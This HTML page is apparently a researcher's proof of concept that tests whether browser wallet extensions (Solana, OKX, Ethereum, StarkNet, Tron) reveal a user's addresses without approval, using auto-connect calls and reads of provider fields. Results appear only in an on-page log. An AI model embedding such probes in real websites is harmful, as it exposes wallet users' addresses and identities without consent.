<!DOCTYPE html>
<html>
<head><title>Bridge Check v2</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family:monospace;font-size:12px;padding:6px;background:#111;color:#0f0}
h2{font-size:14px;color:#ff0;margin:8px 0 4px}
.crit{color:#f00;font-weight:bold}
.ok{color:#0f0}
.warn{color:#ff0}
pre{white-space:pre-wrap;word-break:break-all}
</style>
</head>
<body>
<h2>Solana AutoApprove Test</h2>
<pre id="out">Waiting for providers (5s)...</pre>

<script>
var r = [];
function log(s) { r.push(s); update(); }
function update() { document.getElementById('out').textContent = r.join('\n'); }
function safe(fn) { try { return fn(); } catch(e) { return 'ERR:' + e.message; } }

// Wait for async provider injection
setTimeout(function() {
  log('=== PROVIDERS LOADED ===');

  // 1. Solana connect test
  if (window.solana) {
    log('solana found. autoApprove=' + window.solana.autoApprove);
    log('Before connect: publicKey=' + window.solana.publicKey + ' isConnected=' + window.solana.isConnected);
    log('Calling solana.connect({onlyIfTrusted:true})...');
    try {
      var p = window.solana.connect({onlyIfTrusted: true});
      if (p && p.then) {
        p.then(function(resp) {
          log('SOLANA CONNECT SUCCESS:');
          log('  resp=' + JSON.stringify(resp));
          log('  publicKey=' + (resp && resp.publicKey ? resp.publicKey.toString() : 'null'));
          log('  window.solana.publicKey=' + (window.solana.publicKey ? window.solana.publicKey.toString() : 'null'));
          log('  isConnected=' + window.solana.isConnected);
          if (resp && resp.publicKey) {
            log('*** CRITICAL: Solana address obtained WITHOUT user approval! ***');
          }
        }).catch(function(e) {
          log('solana.connect rejected: ' + e.message);
          log('(This is expected if autoApprove doesnt bypass confirmation)');

          // Try without onlyIfTrusted
          log('');
          log('Trying solana.connect() without onlyIfTrusted...');
          try {
            window.solana.connect().then(function(resp) {
              log('SOLANA CONNECT (no flag) SUCCESS:');
              log('  publicKey=' + (resp && resp.publicKey ? resp.publicKey.toString() : 'null'));
              if (resp && resp.publicKey) {
                log('*** ADDRESS LEAKED via connect() ***');
              }
            }).catch(function(e2) {
              log('solana.connect() also rejected: ' + e2.message);
            });
          } catch(e3) { log('connect() error: ' + e3.message); }
        });
      } else {
        log('connect returned sync: ' + JSON.stringify(p));
      }
    } catch(e) { log('connect error: ' + e.message); }
  } else {
    log('solana: NOT FOUND (still not injected after 5s)');
  }

  // 2. SVM connect test
  log('');
  if (window.svm && window.svm !== window.solana) {
    log('svm found (separate from solana). autoApprove=' + window.svm.autoApprove);
  }

  // 3. Ethereum — read selectedAddress after delay
  log('');
  if (window.ethereum) {
    log('ethereum.selectedAddress=' + window.ethereum.selectedAddress);
    log('ethereum.chainId=' + window.ethereum.chainId);
  }

  // 4. StarkNet selectedAddress
  log('');
  if (window.starknet) {
    log('starknet.selectedAddress=' + window.starknet.selectedAddress);
    log('starknet.chainId=' + safe(function(){return window.starknet.chainId}));
    log('starknet.version=' + safe(function(){return window.starknet.version}));
  }

  // 5. TronWeb defaultAddress
  log('');
  if (window.tronWeb) {
    log('tronWeb.defaultAddress=' + JSON.stringify(window.tronWeb.defaultAddress));
    log('tronWeb.ready=' + safe(function(){return window.tronWeb.ready}));
  }

  // 6. Check all okxwallet sub-provider addresses
  log('');
  if (window.okxwallet) {
    log('=== okxwallet sub-providers ===');
    if (window.okxwallet.selectedAddress) log('MAIN selectedAddress=' + window.okxwallet.selectedAddress);
    if (window.okxwallet.bitcoin) {
      var btcKeys = Object.getOwnPropertyNames(window.okxwallet.bitcoin);
      log('bitcoin keys: ' + btcKeys.slice(0,10).join(','));
      // Check for getAccounts without popup
      if (window.okxwallet.bitcoin.getAccounts) {
        log('bitcoin.getAccounts exists (function)');
      }
    }
    if (window.okxwallet.solana) {
      log('okxwallet.solana._publicKey=' + window.okxwallet.solana._publicKey);
      log('okxwallet.solana.autoApprove=' + safe(function(){return window.okxwallet.solana.autoApprove}));
    }
  }

  // 7. Second delayed check for connect results
  setTimeout(function() {
    log('');
    log('=== FINAL STATE (10s) ===');
    if (window.solana) {
      log('solana.publicKey=' + (window.solana.publicKey ? window.solana.publicKey.toString() : 'null'));
      log('solana.isConnected=' + window.solana.isConnected);
    }
    if (window.ethereum) {
      log('ethereum.selectedAddress=' + window.ethereum.selectedAddress);
    }
    update();
  }, 5000);

}, 5000);
</script>
</body>
</html>
